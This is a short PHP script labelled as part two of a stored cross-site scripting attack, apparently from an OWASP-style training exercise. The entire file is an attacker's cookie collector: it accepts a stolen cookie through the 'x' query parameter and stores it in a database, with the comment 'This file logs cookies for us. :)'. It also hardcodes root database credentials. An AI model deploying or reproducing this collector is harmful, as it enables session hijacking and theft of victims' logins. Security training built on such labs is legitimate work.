<?php
/**********************************************************************
 * Stored Cross-Site Scripting attack, part 2
 * 
 * This file logs cookies for us. :)
 *
 **********************************************************************/

// database connection 
$dsn = 'mysql:host=localhost;dbname=owasp';
$db_user = 'root';
$db_pass = 'kamehameha';
$dbh = new PDO($dsn, $db_user, $db_pass);

// handle database inserts
if (isset($_GET['x']))
{
    $stmt = $dbh->prepare('INSERT INTO cookies (cookie) VALUES (:cookie)');
    $stmt->bindValue(':cookie',$_GET['x']);
    $stmt->execute();
}
